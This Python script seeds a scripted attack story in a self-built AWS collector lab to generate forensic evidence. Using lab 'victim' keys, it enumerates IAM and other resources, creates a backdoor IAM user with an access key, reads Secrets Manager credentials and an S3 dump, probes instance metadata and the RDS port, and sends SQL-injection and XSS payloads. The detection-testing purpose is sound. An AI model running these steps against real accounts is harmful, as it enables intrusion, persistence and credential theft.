#!/usr/bin/env python3
"""Seed a coherent attack story in the live AWS collector lab.

Mirrors the narrative in tests/fixtures/generate_demo_case.py so every collector
pulls evidence from the same incident: compromised dbadmin → recon → persistence →
S3 exfil → WAF/ALB/CloudFront/API/Lambda probing → EKS/RDS/Macie activity.

Reads terraform outputs from docs/deployment/aws/collector-lab/terraform unless
--outputs is passed.

Usage:
    make aws-lab-seed
    uv run python docs/deployment/aws/collector-lab/seed/seed_attack_story.py
"""

from __future__ import annotations

import argparse
import base64
import json
import ssl
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

import boto3
from botocore.exceptions import ClientError


STORY_USER = "ventra-lab-backdoor"
PROJECT = "ventra-lab"
ATTACK_PATHS = [
    ("T1078.004", "Initial access — API calls as compromised dbadmin"),
    ("T1526", "Discovery — account / EC2 / RDS / EKS / KMS / Secrets enumeration"),
    ("T1098.001", "Persistence — backdoor IAM user + access key"),
    ("T1552.001", "Credentials — Secrets Manager db creds read"),
    ("T1530", "Collection — sensitive S3 object reads (server access logs)"),
    ("T1190", "Exploit public app — SQLi/XSS probes against ALB/CloudFront (WAF blocks)"),
    ("T1105", "Serverless — Lambda invoke bursts + API Gateway access logs"),
    ("T1213", "Data from cloud — Macie classification job on sensitive bucket"),
    ("T1021", "Remote services — RDS port probe + resolver DNS from EC2"),
    ("T1609", "Container — EKS kubectl audit activity"),
]


def load_outputs(path: Path | None) -> dict:
    if path and path.is_file():
        raw = json.loads(path.read_text(encoding="utf-8"))
        return {k: v["value"] if isinstance(v, dict) and "value" in v else v for k, v in raw.items()}
    tf_dir = Path(__file__).resolve().parents[1] / "terraform"
    proc = subprocess.run(
        ["terraform", "output", "-json"],
        cwd=tf_dir,
        check=True,
        capture_output=True,
        text=True,
    )
    raw = json.loads(proc.stdout)
    return {k: v["value"] for k, v in raw.items()}


def http_probe(url: str, path: str = "", query: str = "", *, times: int = 1) -> None:
    target = url.rstrip("/")
    if path:
        target = f"{target}{path if path.startswith('/') else '/' + path}"
    if query:
        target = f"{target}?{urllib.parse.quote(query, safe='=&')}"
    for _ in range(times):
        try:
            urllib.request.urlopen(target, timeout=15)  # noqa: S310
        except (urllib.error.HTTPError, urllib.error.URLError, OSError):
            pass
        time.sleep(0.2)


def ssm_run(instance_id: str, commands: list[str], ssm_client, *, wait: bool = True) -> str | None:
    try:
        resp = ssm_client.send_command(
            InstanceIds=[instance_id],
            DocumentName="AWS-RunShellScript",
            Parameters={"commands": commands},
        )
    except ClientError as exc:
        print(f"  (SSM skipped: {exc})")
        return None
    command_id = resp["Command"]["CommandId"]
    if not wait:
        return command_id
    for _ in range(30):
        time.sleep(2)
        try:
            inv = ssm_client.get_command_invocation(CommandId=command_id, InstanceId=instance_id)
        except ClientError:
            continue
        status = inv.get("Status")
        if status in {"Success", "Cancelled", "TimedOut", "Failed", "Cancelling"}:
            return status
    return None


def seed_macie(session, account_id: str, bucket: str) -> None:
    macie = session.client("macie2")
    job_name = f"{PROJECT}-seed-{int(time.time())}"
    try:
        macie.create_classification_job(
            name=job_name,
            description="Ventra lab seed — sensitive bucket scan",
            jobType="ONE_TIME",
            initialRun=True,
            s3JobDefinition={
                "bucketDefinitions": [{"accountId": account_id, "buckets": [bucket]}],
            },
        )
        print(f"  Macie job started: {job_name}")
    except ClientError as exc:
        print(f"  (Macie job skipped: {exc})")


def seed_eks_audit(cluster: str, region: str, session: boto3.Session) -> None:
    eks = session.client("eks")
    try:
        desc = eks.describe_cluster(name=cluster)["cluster"]
    except ClientError as exc:
        print(f"  (EKS describe skipped: {exc})")
        return
    endpoint = desc.get("endpoint", "").rstrip("/")
    ca_data = desc.get("certificateAuthority", {}).get("data")
    if not endpoint or not ca_data:
        print("  (EKS cluster endpoint unavailable)")
        return

    kubeconfig = Path(f"/tmp/{PROJECT}-kubeconfig")
    try:
        subprocess.run(
            [
                "aws",
                "eks",
                "update-kubeconfig",
                "--name",
                cluster,
                "--region",
                region,
                "--kubeconfig",
                str(kubeconfig),
            ],
            check=True,
            capture_output=True,
            text=True,
        )
        env = {"KUBECONFIG": str(kubeconfig)}
        for args in (
            ["kubectl", "get", "nodes"],
            ["kubectl", "get", "pods", "-A"],
            ["kubectl", "get", "namespaces"],
            ["kubectl", "auth", "can-i", "list", "secrets", "--all-namespaces"],
        ):
            try:
                subprocess.run(args, check=False, capture_output=True, text=True, env=env)
            except FileNotFoundError:
                break
            time.sleep(0.5)
        else:
            return
    except (subprocess.CalledProcessError, FileNotFoundError):
        pass

    # Fallback without kubectl: EKS bearer token + Kubernetes API over HTTPS.
    try:
        token_proc = subprocess.run(
            ["aws", "eks", "get-token", "--cluster-name", cluster, "--region", region, "--output", "json"],
            check=True,
            capture_output=True,
            text=True,
        )
        token = json.loads(token_proc.stdout)["status"]["token"]
    except (subprocess.CalledProcessError, FileNotFoundError, KeyError, json.JSONDecodeError) as exc:
        print(f"  (EKS audit seed skipped: {exc})")
        return

    pem = base64.b64decode(ca_data).decode("ascii")
    ctx = ssl.create_default_context()
    ctx.load_verify_locations(cadata=pem)
    for path in ("/api/v1/nodes", "/api/v1/namespaces", "/api/v1/pods"):
        url = f"{endpoint}{path}"
        req = urllib.request.Request(url, headers={"Authorization": f"Bearer {token}"})  # noqa: S310
        try:
            urllib.request.urlopen(req, timeout=20, context=ctx)  # noqa: S310
        except (urllib.error.HTTPError, urllib.error.URLError, OSError):
            pass
        time.sleep(0.5)
    print("  EKS Kubernetes API probed (audit log activity)")


def main() -> int:
    parser = argparse.ArgumentParser(description="Seed Ventra AWS collector lab attack story")
    parser.add_argument("--outputs", type=Path, help="terraform output -json file")
    parser.add_argument("--profile", default=None)
    parser.add_argument("--region", default=None)
    parser.add_argument("--skip-http", action="store_true", help="Skip HTTP probes (ALB/CloudFront/API)")
    args = parser.parse_args()

    outputs = load_outputs(args.outputs)
    region = args.region or outputs["region"]
    session = boto3.Session(profile_name=args.profile, region_name=region)
    account_id = session.client("sts").get_caller_identity()["Account"]
    print(f"[*] Seeding lab in account {account_id} ({region})")

    victim_key = outputs.get("victim_access_key_id")
    victim_secret = outputs.get("victim_secret_access_key")
    if not victim_key or not victim_secret:
        print("Missing victim credentials in terraform outputs", file=sys.stderr)
        return 1

    attacker = boto3.Session(
        aws_access_key_id=victim_key,
        aws_secret_access_key=victim_secret,
        region_name=region,
    )
    iam = attacker.client("iam")
    s3 = attacker.client("s3")
    ec2 = attacker.client("ec2")
    rds = attacker.client("rds")
    eks = attacker.client("eks")
    kms = attacker.client("kms")
    secrets = attacker.client("secretsmanager")
    gd = session.client("guardduty")
    lam = session.client("lambda")
    ddb = session.client("dynamodb")
    ssm = session.client("ssm")

    print("[1/10] Discovery burst as compromised dbadmin (account, cloudtrail, iam, ec2, rds, eks, kms)")
    for action in (
        lambda: iam.list_users(),
        lambda: iam.list_roles(),
        lambda: iam.list_access_keys(UserName=outputs["victim_user"]),
        lambda: iam.get_account_authorization_details(MaxItems=10),
        lambda: s3.list_buckets(),
        lambda: ec2.describe_instances(),
        lambda: ec2.describe_volumes(Filters=[{"Name": "tag:Project", "Values": [PROJECT]}]),
        lambda: rds.describe_db_instances(),
        lambda: kms.list_aliases(Limit=20),
        lambda: secrets.list_secrets(MaxResults=20),
        lambda: lam.list_functions(MaxItems=10),
    ):
        action()
        time.sleep(0.2)
    cluster = outputs.get("eks_cluster_name")
    if cluster:
        eks.list_nodegroups(clusterName=cluster)
        eks.describe_cluster(name=cluster)

    print("[2/10] Persistence — backdoor IAM user")
    try:
        iam.create_user(UserName=STORY_USER, Tags=[{"Key": "Story", "Value": "persistence"}])
    except iam.exceptions.EntityAlreadyExistsException:
        pass
    iam.attach_user_policy(
        UserName=STORY_USER,
        PolicyArn="arn:aws:iam::aws:policy/ReadOnlyAccess",
    )
    try:
        iam.create_access_key(UserName=STORY_USER)
    except iam.exceptions.LimitExceededException:
        pass

    print("[3/10] Secrets + KMS — leaked creds + CMK use (secrets, kms, cloudtrail)")
    secret_name = f"{PROJECT}/dbadmin/credentials"
    try:
        secrets.describe_secret(SecretId=secret_name)
        secrets.get_secret_value(SecretId=secret_name)
    except ClientError as exc:
        print(f"  (Secrets skipped: {exc})")
    try:
        aliases = kms.list_aliases(Limit=50)["Aliases"]
        lab_alias = next((a for a in aliases if a.get("AliasName") == f"alias/{PROJECT}"), None)
        if lab_alias and lab_alias.get("TargetKeyId"):
            key_id = lab_alias["TargetKeyId"]
            kms.describe_key(KeyId=key_id)
            kms.encrypt(
                KeyId=key_id,
                Plaintext=b"ventra-lab-seed-payload",
            )
    except ClientError as exc:
        print(f"  (KMS skipped: {exc})")

    print("[4/10] S3 collection — reads for s3 + s3_access + CloudTrail data events")
    bucket = outputs["sensitive_bucket"]
    s3.list_objects_v2(Bucket=bucket, MaxKeys=10)
    for key in ("exports/db-dump-2026-06-07.sql.gz",):
        try:
            s3.head_object(Bucket=bucket, Key=key)
            s3.get_object(Bucket=bucket, Key=key)
        except ClientError as exc:
            print(f"  (S3 object {key} skipped: {exc})")

    print("[5/10] GuardDuty + Macie (guardduty, securityhub, macie)")
    detector = outputs.get("guardduty_detector_id")
    if detector:
        gd.create_sample_findings(DetectorId=detector)
    seed_macie(session, account_id, bucket)

    print("[6/10] Lambda burst + DynamoDB streams (lambda, lambda_logs, log_posture)")
    fn = outputs.get("lambda_function_name")
    if fn:
        for i in range(5):
            lam.invoke(
                FunctionName=fn,
                InvocationType="RequestResponse",
                Payload=json.dumps({"seed": i, "story": "lab"}).encode(),
            )
            time.sleep(0.3)
    table = outputs.get("dynamodb_table_name")
    if table:
        for sid in ("seed-session-001", "seed-session-002", "seed-session-003"):
            ddb.put_item(
                TableName=table,
                Item={"session_id": {"S": sid}, "story": {"S": "lab-seed"}},
            )
            time.sleep(0.2)
        ddb.update_item(
            TableName=table,
            Key={"session_id": {"S": "seed-session-001"}},
            UpdateExpression="SET story = :s",
            ExpressionAttributeValues={":s": {"S": "lab-seed-updated"}},
        )

    print("[7/10] EKS audit activity (eks_audit)")
    if cluster:
        seed_eks_audit(cluster, region, session)

    print("[8/10] EC2 SSM — DNS resolver + RDS probe (route53_resolver, rds, vpc_flow, ec2)")
    instance_id = outputs.get("ec2_instance_id")
    rds_host = outputs.get("rds_endpoint")
    if instance_id:
        resolver_cmds = [
            "dig +short example.com || nslookup example.com",
            "dig +short amazon.com || nslookup amazon.com",
            "dig +short ventra-lab.internal || true",
            "curl -s -o /dev/null -w '%{http_code}' http://169.254.169.254/latest/meta-data/ || true",
        ]
        if rds_host:
            resolver_cmds.extend(
                [
                    f"getent hosts {rds_host} || nslookup {rds_host} || true",
                    f"timeout 3 bash -c 'echo | nc -w 2 {rds_host} 5432' && echo rds-port-open || echo rds-port-probe",
                ]
            )
        status = ssm_run(instance_id, resolver_cmds, ssm)
        print(f"  SSM command status: {status or 'pending'}")

    if not args.skip_http:
        print("[9/10] Web probes — ALB, CloudFront, API Gateway, WAF (elb_alb, cloudfront, apigateway, waf, vpc_flow)")
        alb = f"http://{outputs['alb_dns_name']}"
        for path in ("/", "/admin-panel", "/admin-panel/login", "/index.html"):
            http_probe(alb, path, times=2)
        for path, query in (
            ("/search", "q=' OR 1=1--"),
            ("/search", "q=1; DROP TABLE users--"),
            ("/comment", "body=<script>alert(1)</script>"),
            ("/comment", "body=<img src=x onerror=alert(1)>"),
            ("/login", "user=admin'--"),
        ):
            http_probe(alb, path, query, times=2)

        cf_domain = outputs.get("cloudfront_domain")
        if cf_domain:
            cf_url = f"https://{cf_domain}"
            for path in ("/", "/admin-panel", "/admin-panel/login"):
                http_probe(cf_url, path, times=2)
            http_probe(cf_url, "/search", "q=' OR 1=1--", times=2)
            http_probe(cf_url, "/comment", "body=<script>alert(1)</script>", times=2)

        api_url = outputs.get("api_gateway_invoke_url")
        if api_url:
            http_probe(api_url, times=3)

    print("[10/10] CloudTrail enrichment — describe snapshots + security services")
    session.client("ec2").describe_snapshots(
        OwnerIds=[account_id],
        Filters=[{"Name": "tag:Project", "Values": [PROJECT]}],
    )
    session.client("cloudtrail").lookup_events(LookupAttributes=[{"AttributeKey": "EventName", "AttributeValue": "GetObject"}], MaxResults=5)
    session.client("securityhub").get_findings(MaxResults=5)

    print("\nAttack story seeded. Mapped techniques:")
    for technique, desc in ATTACK_PATHS:
        print(f"  {technique}: {desc}")
    print("\nRun Ventra collection with connection to this account and case id:", outputs.get("case_id"))
    print("Note: CloudFront/WAF/ALB S3 logs and Macie results can take 15–60 minutes to appear.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
